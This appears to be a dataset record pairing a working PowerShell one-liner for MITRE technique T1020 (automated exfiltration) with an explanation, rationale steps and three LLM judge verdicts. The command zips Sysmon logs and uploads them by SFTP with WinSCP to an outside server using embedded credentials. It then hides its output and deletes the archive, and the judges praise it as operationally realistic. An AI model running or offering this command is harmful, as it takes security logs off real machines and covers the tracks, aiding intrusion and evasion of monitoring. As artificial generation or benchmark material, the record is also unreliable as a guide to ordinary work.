command: $zip="$env:TEMP\sysmon_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip"; Compress-Archive -Path 'C:\ProgramData\Sysmon\*.log' -DestinationPath $zip -Force; $r="/incoming/$env:COMPUTERNAME/"; & 'C:\Program Files (x86)\WinSCP\WinSCP.com' /ini=nul /command 'option batch abort' 'option confirm off' 'open sftp://exfil:S3cr3t!@198.51.100.20/ -hostkey="ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="' ("put `"$zip`" `"$r`" -nopermissions -preservetime -resume") 'exit' | Out-Null; if($LASTEXITCODE -eq 0){ Remove-Item -Path $zip -Force -ErrorAction SilentlyContinue } 2>$null
explanation: Archives Sysmon logs and exfiltrates the archive via SFTP using WinSCP with host key pinning and non-interactive batch options, then cleans up the local archive.
rationale_steps: Package target data to a single archive to reduce transfer artifacts
Open a non-interactive SFTP session with host key pinning
Upload the archive with resume and preserved timestamps
Suppress console output and remove local artifacts on success

llm_judgments.syntactic_justification: The PowerShell one-liner has balanced quoting and escaping, valid separators, and correct WinSCP /command argument structure, making it well-formed and parseable.
llm_judgments.semantic_justification: It compresses specified logs, then non-interactively exfiltrates the archive via SFTP with host key pinning and cleanup, which is operationally plausible and aligns with automated exfiltration (T1020).

llm_judgments.syntactic_justification: The command is well-formed with balanced quotes, proper PowerShell string interpolation, correct use of semicolons as separators, valid escape sequences (backtick for inner quotes), and proper redirection syntax.
llm_judgments.semantic_justification: The command fully achieves automated exfiltration (T1020) by timestamping and compressing Sysmon logs via Compress-Archive, transferring the archive to an external SFTP server using WinSCP in non-interactive batch mode with host key pinning, and cleaning up the local artifact on success — all operationally realistic and consistent with the technique description.

llm_judgments.syntactic_justification: The command is well-formed, using correct PowerShell variable expansion, command separators, and proper quoting for the external WinSCP executable call.
llm_judgments.semantic_justification: The command perfectly illustrates T1020 by automating the collection/compression of logs, using a scripted third-party transfer tool (WinSCP) with non-interactive flags, and performing post-exfiltration cleanup.
